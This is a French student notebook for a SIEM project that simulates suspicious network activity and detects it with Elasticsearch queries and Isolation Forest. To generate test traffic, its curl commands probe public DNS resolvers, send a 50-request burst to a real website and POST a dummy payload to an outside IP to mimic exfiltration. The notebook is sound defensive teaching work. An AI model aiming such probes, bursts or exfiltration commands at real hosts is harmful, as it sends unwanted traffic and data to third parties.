# Projet SIEM : Suricata, Filebeat, Elasticsearch

## Objectifs

Ce projet vous permettra de :
- Vérifier le bon fonctionnement de la stack SIEM
- Analyser les données indexées par Filebeat (Suricata)
- Détecter des anomalies sans ML
- Détecter des anomalies avec ML (Isolation Forest)

## Modalité
- groupe de 3 à 4
- output : projet git avec ce notebook détaillé et complété

## Architecture SIEM

```
Suricata   →   Filebeat   →   Elasticsearch   →   Kibana
(IDS/HIDS)   (Collecteur)      (Stockage)   (Visualisation/Alerting)
```

## Prérequis

1. Démarrer la stack :
```bash
docker-compose -f docker-compose-siem.yml up -d
```

2. Attendre quelques minutes que Suricata génère des logs et que Filebeat les indexe dans Elasticsearch.

In [15]:
# Configuration et connexion à Elasticsearch
from elasticsearch import Elasticsearch
from datetime import datetime, timedelta
import json
import subprocess
import os
import warnings
from urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter("ignore", InsecureRequestWarning)
# Configuration
ES_HOST = "https://localhost:9200"
ES_USER = "elastic"
ES_PASSWORD = "changeme"  # Modifiez selon votre .env

# Connexion
es = Elasticsearch(
    [ES_HOST],
    basic_auth=(ES_USER, ES_PASSWORD),
    verify_certs=False
)

# Vérification de la connexion
health = es.cluster.health()
print(f"✅ Cluster Elasticsearch: {health['status']} ({health['number_of_nodes']} nœuds)")

✅ Cluster Elasticsearch: green (3 nœuds)


/Users/kasia/Library/Python/3.13/lib/python/site-packages/elasticsearch/_sync/client/__init__.py:313: SecurityWarning: Connecting to 'https://localhost:9200' using TLS with verify_certs=False is insecure
  _transport = transport_class(


## 1. Vérification de la stack

In [16]:
# Vérification des services Docker
services = ['es01', 'es02', 'es03', 'kibana', 'suricata', 'filebeat']
running = []

for service in services:
    try:
        result = subprocess.run(
            ['docker', 'ps', '--filter', f'name={service}', '--format', '{{.Names}}'],
            capture_output=True, text=True, timeout=5
        )
        if service in result.stdout:
            running.append(service)
            print(f"✅ {service}")
        else:
            print(f"❌ {service}")
    except:
        print(f"❌ {service}")

if len(running) == len(services):
    print(f"\n✅ Tous les services sont démarrés ({len(running)}/{len(services)})")
else:
    print(f"\n⚠️  Services démarrés: {len(running)}/{len(services)}")

✅ es01
✅ es02
✅ es03
✅ kibana
✅ suricata
✅ filebeat

✅ Tous les services sont démarrés (6/6)


## 2. Vérification de l'injection des données

In [17]:
# Recherche des index Suricata
def get_suricata_index():
    """Retourne le nom de l'index Suricata le plus récent"""
    try:
        indices = es.indices.get(index="suricata-*")
        if indices:
            return sorted(indices.keys())[-1]
    except:
        pass
    return "suricata-*"

index_name = get_suricata_index()

# Comptage des documents
try:
    count = es.count(index=index_name)
    print(f"📊 Index: {index_name}")
    print(f"📈 Nombre de documents: {count['count']:,}")
    
    # Exemple de document
    if count['count'] > 0:
        sample = es.search(index=index_name, size=1, query={"match_all": {}})
        if sample['hits']['hits']:
            doc = sample['hits']['hits'][0]['_source']
            print(f"\n📄 Exemple de document:")
            print(f"   Type: {doc.get('event_type', 'N/A')}")
            print(f"   Timestamp: {doc.get('@timestamp', doc.get('timestamp', 'N/A'))}")
            if 'src_ip' in doc:
                print(f"   Source: {doc.get('src_ip')}:{doc.get('src_port', 'N/A')}")
                print(f"   Destination: {doc.get('dest_ip')}:{doc.get('dest_port', 'N/A')}")
            if 'alert' in doc:
                alert = doc['alert']
                print(f"   Alerte: {alert.get('signature', 'N/A')}")
                print(f"   Sévérité: {alert.get('severity', 'N/A')}")
except Exception as e:
    print(f"❌ Erreur: {e}")

📊 Index: .ds-suricata-2026.03.29-2026.03.29-000001
📈 Nombre de documents: 3,434

📄 Exemple de document:
   Type: flow
   Timestamp: 2026-03-29T08:49:16.127Z
   Source: 192.168.65.1:16363
   Destination: 192.168.65.7:2376


## 4. Simuler des comportements anormaux


#### Simulation de scans suspects (en ligne de commande ou en python) 

In [18]:
import subprocess
import time

targets = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]

for target in targets:
    print(f"scan {target}...")
    try:
        subprocess.run(
            ["docker", "exec", "suricata", "curl", "-s", "--connect-timeout", "2", 
             f"http://{target}:80", f"http://{target}:443", f"http://{target}:8080"],
            capture_output=True, timeout=10
        )
    except:
        pass

suspicious_domains = [
    "domaine1-suspect.fr",
    "domaine2-suspect.fr",
    "domaine3-suspect.fr",
    "domaine4-suspect.fr",
    "domaine5-suspect.fr"
]

for domain in suspicious_domains:
    print(f"dns suspect: {domain}")
    try:
        subprocess.run(
            ["docker", "exec", "suricata", "curl", "-s", "--connect-timeout", "2", 
             f"http://{domain}"],
            capture_output=True, timeout=10
        )
    except:
        pass

print("\nscan suspect terminé. Traitement par suricata")

scan 8.8.8.8...
scan 1.1.1.1...
scan 9.9.9.9...
dns suspect: domaine1-suspect.fr
dns suspect: domaine2-suspect.fr
dns suspect: domaine3-suspect.fr
dns suspect: domaine4-suspect.fr
dns suspect: domaine5-suspect.fr

scan suspect terminé. Traitement par suricata


#### Simulation de burst HTTP en ligne de commande (en ligne de commande ou en python) 

In [19]:
import threading

target_url = "http://lapoposte.fr"
nb_requests = 50

def send_request(i):
    try:
        subprocess.run(
            ["docker", "exec", "suricata", "curl", "-s", "--connect-timeout", "2", target_url],
            capture_output=True, timeout=10
        )
    except:
        pass

print(f"envoi de {nb_requests} requêtes")
threads = []
for i in range(nb_requests):
    t = threading.Thread(target=send_request, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print(f"({nb_requests} requêtes envoyées)")
print("indexation")
time.sleep(30)

envoi de 50 requêtes
(50 requêtes envoyées)
indexation


#### Simulation de ssh attaque la plus fréquente sur internet

In [16]:
ssh_targets = ["192.168.1.1", "10.0.0.1", "172.16.0.1"]

print("simulation de connexions ssh")
for target in ssh_targets:
    for attempt in range(20):
        try:
            subprocess.run(
                ["docker", "exec", "suricata", "curl", "-s", "--connect-timeout", "1",
                 f"http://{target}:22"],
                capture_output=True, timeout=5
            )
        except:
            pass
    print(f"  → {target}: 20 tentatives envoyées")

print("terminé")
print("indexation")
time.sleep(30)

simulation de connexions ssh
  → 192.168.1.1: 20 tentatives envoyées
  → 10.0.0.1: 20 tentatives envoyées
  → 172.16.0.1: 20 tentatives envoyées
terminé
indexation


## 4. Détection d'anomalies sans ML

## 4. Détection d'anomalie (sans Machine Learning)

L'objectif est de construire des règles qui détectent vos simulations de comportements précédents.

Un exemple de détection d'anomalies basiques basées sur des règles:
```python
def detect_anomalies_basic():
    """Détecte des anomalies sans ML"""
    anomalies = []
    
    # 1. IPs sources avec beaucoup d'alertes différentes (scan suspect)
    query = {
        "size": 0,
        "query": {"term": {"event_type": "alert"}},
        "aggs": {
            "suspicious_ips": {
                "terms": {"field": "src_ip", "size": 10},
                "aggs": {
                    "unique_signatures": {"cardinality": {"field": "alert.signature_id"}},
                    "unique_dest_ips": {"cardinality": {"field": "dest_ip"}},
                    "total_alerts": {"value_count": {"field": "event_type"}}
                }
            }
        }
    }
    
    result = es.search(index=index_name, body=query)
    
    print("Détection d'anomalies (règles basiques)\n")

    for bucket in result['aggregations']['suspicious_ips']['buckets']:
        ip = bucket['key']
        unique_sigs = bucket['unique_signatures']['value']
        unique_dests = bucket['unique_dest_ips']['value']
        total = bucket['total_alerts']['value']
        
        # Critères d'anomalie
        if unique_sigs > 3 or unique_dests > 5:
            anomalies.append({
                "ip": ip,
                "type": "Scan suspect",
                "signatures": unique_sigs,
                "destinations": unique_dests,
                "total": total
            })
            print(f"🚨 {ip}: {unique_sigs} signatures, {unique_dests} destinations ({total} alertes)")

    return anomalies

anomalies = detect_anomalies_basic()
if not anomalies:
    print("\nAucune anomalie détectée avec les règles basiques")
```

In [20]:
count = es.count(index=index_name)
print(f"Documents dans l'index: {count['count']}")
print(f"Index utilisé: {index_name}")

if count['count'] > 0:
    sample = es.search(index=index_name, size=1, query={"match_all": {}})
    doc = sample['hits']['hits'][0]['_source']
    print(f"\nChamps disponibles:")
    for key in sorted(doc.keys()):
        print(f"  - {key}")

Documents dans l'index: 10661
Index utilisé: .ds-suricata-2026.03.29-2026.03.29-000001

Champs disponibles:
  - @timestamp
  - agent
  - alert
  - dest_ip
  - dest_port
  - direction
  - ecs
  - error
  - event_type
  - fields
  - flow
  - flow_id
  - host
  - in_iface
  - input
  - ip_v
  - log
  - pkt_src
  - proto
  - src_ip
  - src_port
  - timestamp


In [21]:
def detect_anomalies_basic():
    """Détecte des anomalies sans ML"""
    anomalies = []
    
    # Règle 1 : IPs sources avec beaucoup d'alertes différentes (scan suspect)
#Un utilisateur normal se connecte à des serveurs précis où il sait qu'il est autorisé.  
#S'il a en destination plusieurs d'IPs ou des ports différents il est en train d'explorer : c'est suspect.
#Donc sauf à ce qu'il soit sur une plage autorisée sur sa propre IP il faut loguer ces interactions.
    query_scan = {
        "size": 0,
        "query": {"match_all": {}},
        "aggs": {
            "par_ip_source": {
                "terms": {"field": "src_ip", "size": 20},
                "aggs": {
                    "destinations_uniques": {"cardinality": {"field": "dest_ip"}},
                    "ports_uniques": {"cardinality": {"field": "dest_port"}}
                }
            }
        }
    }
    
    result = es.search(index=index_name, body=query_scan)
    print("=== Règle 1 : Détection de scans (beaucoup de destinations) ===\n")
    for bucket in result['aggregations']['par_ip_source']['buckets']:
        ip = bucket['key']
        nb_dest = bucket['destinations_uniques']['value']
        nb_ports = bucket['ports_uniques']['value']
        # Critères d'anomalie
        if nb_dest > 3 or nb_ports > 3:
            anomalies.append({"ip": ip, "type": "Scan suspect", "destinations": nb_dest, "ports": nb_ports})
            print(f"  🚨 {ip} → {nb_dest} destinations, {nb_ports} ports différents")
    
    # Règle 2 : burst http
#On part du principe qu'au delà de 20 requêtes c'est de l'automatisation ou une attaque.
#Ce n'est pas un comportement humain classique. 
    query_burst = {
        "size": 0,
        "query": {"term": {"event_type": "http"}},
        "aggs": {
            "par_ip_source": {
                "terms": {"field": "src_ip", "size": 10},
                "aggs": {
                    "nb_requetes": {"value_count": {"field": "event_type"}}
                }
            }
        }
    }
    
    result = es.search(index=index_name, body=query_burst)
    print("\n=== Règle 2 : burst http ===\n")
    for bucket in result['aggregations']['par_ip_source']['buckets']:
        ip = bucket['key']
        nb_req = bucket['nb_requetes']['value']
        # Critères d'anomalie
        if nb_req > 20:
            anomalies.append({"ip": ip, "type": "Burst HTTP", "requetes": nb_req})
            print(f"  🚨 {ip} → {nb_req} requêtes HTTP")
    
    # Règle 3 : ssh port 22
#Si on a des accès ssh on va se connecter 1 ou au pire 2 s'il y a une erreur de frappe et c'est tout.
#Au delà de 5 il y a une grosse probabilité de tentative de bruteforce.
    query_ssh = {
        "size": 0,
        "query": {"term": {"dest_port": 22}},
        "aggs": {
            "par_ip_source": {
                "terms": {"field": "src_ip", "size": 10},
                "aggs": {
                    "nb_tentatives": {"value_count": {"field": "event_type"}},
                    "cibles_uniques": {"cardinality": {"field": "dest_ip"}}
                }
            }
        }
    }
    
    result = es.search(index=index_name, body=query_ssh)
    print("\n=== Règle 3 : ssh port 22 ===\n")
    for bucket in result['aggregations']['par_ip_source']['buckets']:
        ip = bucket['key']
        nb = bucket['nb_tentatives']['value']
        cibles = bucket['cibles_uniques']['value']
        # Critères d'anomalie
        if nb > 5:
            anomalies.append({"ip": ip, "type": "Bruteforce SSH", "tentatives": nb, "cibles": cibles})
            print(f"  🚨 {ip} → {nb} tentatives ssh sur {cibles} cibles")
    
    return anomalies

anomalies = detect_anomalies_basic()
print(f"\n{'='*50}")
print(f"Total anomalies détectées : {len(anomalies)}")
if not anomalies:
    print("\nAucune anomalie détectée avec les règles basiques")

=== Règle 1 : Détection de scans (beaucoup de destinations) ===

  🚨 34.95.113.255 → 1 destinations, 13 ports différents
  🚨 192.168.65.3 → 7 destinations, 2 ports différents
  🚨 169.254.169.254 → 1 destinations, 23 ports différents
  🚨 192.168.65.7 → 1 destinations, 10 ports différents

=== Règle 2 : burst http ===


=== Règle 3 : ssh port 22 ===


Total anomalies détectées : 4


## 5. Détection d'anomalies avec ML

L'objectif est d'à partir de données labelisées comme étant anomarles ou non, construire un jeu de donnée et entrainer un algorithme de machine learning (classifier binaire) sur ces données. Le modèle devra ensuite etre appelé pour prédire les futurs comportements anormaux.

Indice: le modèle Isolation Forest pourrait etre utile

In [22]:
import pandas as pd
import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler

# 1 dataset
query = {
    "size": 0,
    "aggs": {
        "par_ip": {
            "terms": {"field": "src_ip", "size": 100},
            "aggs": {
                "nb_flux": {"value_count": {"field": "event_type"}},
                "ports_uniques": {"cardinality": {"field": "dest_port"}},
                "dest_uniques": {"cardinality": {"field": "dest_ip"}},
                "nb_alertes": {
                    "filter": {"term": {"event_type": "alert"}}
                },
                "types_events": {"cardinality": {"field": "event_type"}}
            }
        }
    }
}

result = es.search(index=index_name, body=query)

# 2 dataframe
data = []
for bucket in result['aggregations']['par_ip']['buckets']:
    data.append({
        "ip": bucket['key'],
        "nb_flux": bucket['nb_flux']['value'],
        "ports_uniques": bucket['ports_uniques']['value'],
        "dest_uniques": bucket['dest_uniques']['value'],
        "nb_alertes": bucket['nb_alertes']['doc_count'],
        "types_events": bucket['types_events']['value']
    })

df = pd.DataFrame(data)
print("dataset construit")
print(f"IPs analysées : {len(df)}")
print(f"\n{df.to_string(index=False)}\n")

# 3 ml
features = ["nb_flux", "ports_uniques", "dest_uniques", "nb_alertes", "types_events"]
X = df[features].values

# normalisation des data
scaler = StandardScaler()
X_scaled = scaler.fit_transform(X)

# entrainement
# contamination
model = IsolationForest(
    n_estimators=100,
    contamination=0.3,
    random_state=42
)
model.fit(X_scaled)

# 5 : predict
# -1 = ano, 1 = ok
df['prediction'] = model.predict(X_scaled)
df['score'] = model.score_samples(X_scaled)  # plus le score est bas, plus c'est anormal
df['statut'] = df['prediction'].map({1: 'Normal', -1: 'ANOMALIE'})

# 6 resultats
print("résultats forest\n")
anomalies_ml = df[df['prediction'] == -1].sort_values('score')
normaux = df[df['prediction'] == 1].sort_values('score')

print(f"anomalies détectées : {len(anomalies_ml)}")
print(f"comportements normaux : {len(normaux)}\n")

print("anompalies")
for _, row in anomalies_ml.iterrows():
    print(f"  🚨 {row['ip']:20s} | flux: {row['nb_flux']:>5.0f} | ports: {row['ports_uniques']:>3.0f} | dest: {row['dest_uniques']:>3.0f} | alertes: {row['nb_alertes']:>4.0f} | score: {row['score']:.3f}")

print("\nok")
for _, row in normaux.iterrows():
    print(f"  ✅ {row['ip']:20s} | flux: {row['nb_flux']:>5.0f} | ports: {row['ports_uniques']:>3.0f} | dest: {row['dest_uniques']:>3.0f} | alertes: {row['nb_alertes']:>4.0f} | score: {row['score']:.3f}")

dataset construit
IPs analysées : 11

             ip  nb_flux  ports_uniques  dest_uniques  nb_alertes  types_events
   192.168.65.1     9260              2             2        8435             2
    3.209.33.21      953              2             1         953             1
 34.120.127.130      202              2             1         202             1
  34.95.113.255      196             13             1         196             1
   192.168.65.3       58              2             7           4             2
169.254.169.254       35             23             1          23             2
   192.168.65.7       10             10             1           1             2
        1.1.1.1        9              2             1           9             1
        8.8.8.8        8              2             1           8             1
        9.9.9.9        8              2             1           8             1
 143.204.194.55        6              1             1           6             1

r

## Isolation forest : Analyse

Le principe de base : les points de données anormaux sont plus facile à isoler que les normaux. Donc l'algo construit un arbre de décisions aléatoire et mesure le nombre de coupure pour isoler chaque point. Moins il en faut plus le point est différent.
IP 192.168.65.1 sdcore : -0,750 à cause du volume de traffic supérieur aux autres IP
IP 192.168.65.3 score -0,597 plus de destinations que les autres 
IP 34.95.113.255 est une ip google cloud. Elle est selectionnée car 100% des flux sont des alertes. 

## Bonus
- améliorer la stack (ex: ajout de Wazuh)
- dashboard Kibana pour voir en live les simulations de comportements anormaux et les détection d'anomalie (timeline des alertes, etc.)
- analyse statistique avancée
- simulations de comportement anormaux avancée
- utilisation du module de détection d'anomalie d'Elasticsearch (https://www.elastic.co/docs/explore-analyze/machine-learning/anomaly-detection)
- collaboration en groupe sur le projet Git (Pull requests, commits, etc.)
- utilisation de docker / docker compose / devcontainer
- etc.

## 5. Détection temporelle 
On va essayer de détecter par tranche de temps pour avoir des pics anormaux d'activité comme dans les siem. Cela permettrait d'avoir une meilleure lecture des résultats entre les actions et la temporalité.

In [23]:
from sklearn.ensemble import IsolationForest
import pandas as pd
import numpy as np

# 1 : traffic par minute
query_time = {
    "size": 0,
    "aggs": {
        "par_minute": {
            "date_histogram": {
                "field": "@timestamp",
                "fixed_interval": "1m"
            },
            "aggs": {
                "ips_uniques": {"cardinality": {"field": "src_ip"}},
                "ports_uniques": {"cardinality": {"field": "dest_port"}},
                "nb_alertes": {"filter": {"term": {"event_type": "alert"}}},
                "dest_uniques": {"cardinality": {"field": "dest_ip"}}
            }
        }
    }
}

result = es.search(index=index_name, body=query_time)

# 2 : dataset temporel
rows = []
for bucket in result['aggregations']['par_minute']['buckets']:
    rows.append({
        "timestamp": bucket['key_as_string'],
        "nb_events": bucket['doc_count'],
        "ips_uniques": bucket['ips_uniques']['value'],
        "ports_uniques": bucket['ports_uniques']['value'],
        "nb_alertes": bucket['nb_alertes']['doc_count'],
        "dest_uniques": bucket['dest_uniques']['value']
    })

df_time = pd.DataFrame(rows)
df_time['timestamp'] = pd.to_datetime(df_time['timestamp'])

print(f"analyse temporelle")
print(f"période : {df_time['timestamp'].min()} → {df_time['timestamp'].max()}")
print(f"tranches d'1 minute : {len(df_time)}\n")

# 3 : statistique des pics
mean_events = df_time['nb_events'].mean()
std_events = df_time['nb_events'].std()
seuil = mean_events + 2 * std_events  # au-delà de 2 écarts-types = pic anormal

print(f"moyenne d'événements par minute : {mean_events:.1f}")
print(f"écart-type : {std_events:.1f}")
print(f"seuil d'anomalie (moyenne + 2σ) : {seuil:.1f}\n")

# 4 Z-score
df_time['z_score'] = (df_time['nb_events'] - mean_events) / std_events
df_time['anomalie_stats'] = df_time['z_score'] > 2

# 5 : isolation forest pour la temporalité
features_time = ["nb_events", "ips_uniques", "ports_uniques", "nb_alertes", "dest_uniques"]
X_time = df_time[features_time].values

scaler_time = StandardScaler()
X_time_scaled = scaler_time.fit_transform(X_time)

model_time = IsolationForest(n_estimators=100, contamination=0.15, random_state=42)
model_time.fit(X_time_scaled)

df_time['anomalie_ml'] = model_time.predict(X_time_scaled)
df_time['score_ml'] = model_time.score_samples(X_time_scaled)

# 6 résultats
pics_stats = df_time[df_time['anomalie_stats'] == True]
pics_ml = df_time[df_time['anomalie_ml'] == -1]

print(f" pics par z-score (> 2σ) : {len(pics_stats)} ---")
for _, row in pics_stats.iterrows():
    print(f"  🚨 {row['timestamp']} | {row['nb_events']:>4} events | {row['nb_alertes']:>4} alertes | z={row['z_score']:.2f}")

print(f"\npics détectés par isolation forest : {len(pics_ml)} ---")
for _, row in pics_ml.sort_values('score_ml').iterrows():
    print(f"  🚨 {row['timestamp']} | {row['nb_events']:>4} events | {row['nb_alertes']:>4} alertes | score={row['score_ml']:.3f}")

# 7 comparaison
les_deux = df_time[(df_time['anomalie_stats'] == True) & (df_time['anomalie_ml'] == -1)]
stats_seul = df_time[(df_time['anomalie_stats'] == True) & (df_time['anomalie_ml'] == 1)]
ml_seul = df_time[(df_time['anomalie_stats'] == False) & (df_time['anomalie_ml'] == -1)]

print(f"\n--- comparaison des 2 méthodes ---")
print(f"  détectés par les deux : {len(les_deux)}")
print(f"  z-score uniquement   : {len(stats_seul)}")
print(f"  ml uniquement         : {len(ml_seul)}")

analyse temporelle
période : 2026-03-29 08:48:00+00:00 → 2026-03-29 08:53:00+00:00
tranches d'1 minute : 6

moyenne d'événements par minute : 1920.5
écart-type : 998.6
seuil d'anomalie (moyenne + 2σ) : 3917.6

 pics par z-score (> 2σ) : 0 ---

pics détectés par isolation forest : 1 ---
  🚨 2026-03-29 08:48:00+00:00 | 2905 events | 2898 alertes | score=-0.542

--- comparaison des 2 méthodes ---
  détectés par les deux : 0
  z-score uniquement   : 0
  ml uniquement         : 1


## 6. Fuite de données
On va essayer de détecter des fuites de données, dans le cas où une personne essaie d'exfiltrer de nombreuses données d'entreprises (espionnage, licenciement, conflit etc) vers une ip externe (cloud personnel).

## Création de la data

In [24]:
import subprocess
import time

# on génére un faux fichier pour simuler des données d'entreprise
fake_data = "dataslapoposte" * 500  # payload volumineux

print("simulation d'exfiltration de données...")
for i in range(10):
    try:
        subprocess.run(
            ["docker", "exec", "suricata", "curl", "-s", "--connect-timeout", "2",
             "-X", "POST", "-d", fake_data,
             "http://93.184.216.34"],  #fausse ip inventée
            capture_output=True, timeout=10
        )
    except:
        pass
    print(f"  → Envoi {i+1}/10 ({len(fake_data)} octets)")

print("Exfiltration simulée")

simulation d'exfiltration de données...
  → Envoi 1/10 (7000 octets)
  → Envoi 2/10 (7000 octets)
  → Envoi 3/10 (7000 octets)
  → Envoi 4/10 (7000 octets)
  → Envoi 5/10 (7000 octets)
  → Envoi 6/10 (7000 octets)
  → Envoi 7/10 (7000 octets)
  → Envoi 8/10 (7000 octets)
  → Envoi 9/10 (7000 octets)
  → Envoi 10/10 (7000 octets)
Exfiltration simulée


## Détection règle basique

In [27]:
query_exfil = {
    "size": 0,
    "query": {"term": {"event_type": "flow"}},
    "aggs": {
        "par_ip": {
            "terms": {"field": "src_ip", "size": 20},
            "aggs": {
                "bytes_envoyes": {"sum": {"field": "flow.bytes_toserver"}},
                "nb_flux": {"value_count": {"field": "event_type"}},
                "destinations": {"cardinality": {"field": "dest_ip"}}
            }
        }
    }
}

result = es.search(index=index_name, body=query_exfil)

print("Détection d'exfiltration de données\n")

for bucket in result['aggregations']['par_ip']['buckets']:
    ip = bucket['key']
    bytes_sent = bucket['bytes_envoyes']['value']
    nb_flux = bucket['nb_flux']['value']
    nb_dest = bucket['destinations']['value']

    avg_bytes = bytes_sent / nb_flux if nb_flux > 0 else 0

# règle pour détection
    
    if avg_bytes > 1000:
        print(f"  ALERTE COMPORTEMENT SUSPICIEUX : {ip} → {bytes_sent:,.0f} octets envoyés en {nb_flux} flux (moyenne: {avg_bytes:,.0f} octets/flux) vers {nb_dest} destinations")
    else:
        print(f"  COMPORTEMENT NORMAL : {ip} → {bytes_sent:,.0f} octets envoyés en {nb_flux} flux (moyenne: {avg_bytes:,.0f} octets/flux)")

Détection d'exfiltration de données

  COMPORTEMENT NORMAL : 192.168.65.1 → 963,820 octets envoyés en 1206 flux (moyenne: 799 octets/flux)
  ALERTE COMPORTEMENT SUSPICIEUX : 192.168.65.3 → 617,824 octets envoyés en 86 flux (moyenne: 7,184 octets/flux) vers 9 destinations
  COMPORTEMENT NORMAL : 169.254.169.254 → 648 octets envoyés en 12 flux (moyenne: 54 octets/flux)
  ALERTE COMPORTEMENT SUSPICIEUX : 192.168.65.7 → 5,326,415 octets envoyés en 9 flux (moyenne: 591,824 octets/flux) vers 1 destinations


## Détection ML

In [26]:
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
import pandas as pd

query_exfil_ml = {
    "size": 0,
    "query": {"term": {"event_type": "flow"}},
    "aggs": {
        "par_ip": {
            "terms": {"field": "src_ip", "size": 50},
            "aggs": {
                "bytes_envoyes": {"sum": {"field": "flow.bytes_toserver"}},
                "bytes_recus": {"sum": {"field": "flow.bytes_toclient"}},
                "nb_flux": {"value_count": {"field": "event_type"}},
                "destinations": {"cardinality": {"field": "dest_ip"}},
                "ports_uniques": {"cardinality": {"field": "dest_port"}}
            }
        }
    }
}

result = es.search(index=index_name, body=query_exfil_ml)

data_exfil = []
for bucket in result['aggregations']['par_ip']['buckets']:
    nb_flux = bucket['nb_flux']['value']
    bytes_out = bucket['bytes_envoyes']['value']
    bytes_in = bucket['bytes_recus']['value']
    data_exfil.append({
        "ip": bucket['key'],
        "bytes_envoyes": bytes_out,
        "bytes_recus": bytes_in,
        "nb_flux": nb_flux,
        "destinations": bucket['destinations']['value'],
        "ports_uniques": bucket['ports_uniques']['value'],
        "moyenne_octets_flux": bytes_out / nb_flux if nb_flux > 0 else 0,
        "ratio_envoi_reception": bytes_out / bytes_in if bytes_in > 0 else bytes_out
    })

df_exfil = pd.DataFrame(data_exfil)

features_exfil = ["bytes_envoyes", "bytes_recus", "nb_flux", "destinations", 
                  "ports_uniques", "moyenne_octets_flux", "ratio_envoi_reception"]
X_exfil = df_exfil[features_exfil].values

scaler_exfil = StandardScaler()
X_exfil_scaled = scaler_exfil.fit_transform(X_exfil)

model_exfil = IsolationForest(n_estimators=100, contamination=0.25, random_state=42)
model_exfil.fit(X_exfil_scaled)

df_exfil['prediction'] = model_exfil.predict(X_exfil_scaled)
df_exfil['score'] = model_exfil.score_samples(X_exfil_scaled)

print("Détection ML d'exfiltration de données\n")

anomalies_exfil = df_exfil[df_exfil['prediction'] == -1].sort_values('score')
normaux_exfil = df_exfil[df_exfil['prediction'] == 1].sort_values('score')

for _, row in anomalies_exfil.iterrows():
    print(f"EXFILTRATION SUSPECTE : {row['ip']}")
    print(f"Volume envoyé: {row['bytes_envoyes']:,.0f} octets | Reçu: {row['bytes_recus']:,.0f} octets")
    print(f"Ratio envoi/réception: {row['ratio_envoi_reception']:.2f} | Moyenne/flux: {row['moyenne_octets_flux']:,.0f} octets")
    print(f"Score anomalie: {row['score']:.3f}\n")

for _, row in normaux_exfil.iterrows():
    print(f"Normal : {row['ip']} | envoyé: {row['bytes_envoyes']:,.0f} | score: {row['score']:.3f}")

Détection ML d'exfiltration de données

EXFILTRATION SUSPECTE : 192.168.65.7
Volume envoyé: 5,326,415 octets | Reçu: 97,152 octets
Ratio envoi/réception: 54.83 | Moyenne/flux: 591,824 octets
Score anomalie: -0.491

Normal : 169.254.169.254 | envoyé: 648 | score: -0.457
Normal : 192.168.65.1 | envoyé: 937,090 | score: -0.424
Normal : 192.168.65.3 | envoyé: 617,560 | score: -0.404


## Analyse des 2 résultats : 
La règle basique ne regarde que les seuils fixés de manière très binaire. Le ML prend en compte différents critères : bytes envoyés, bytes reçus, nombre de flux, destinations, ports uniques, moyenne en octets des flux et ratio envoi/réception. Cette méthode permet d'éviter les faux positifs et offre un résultat plus fiable dans le cadre d'une surveillance de SIEM.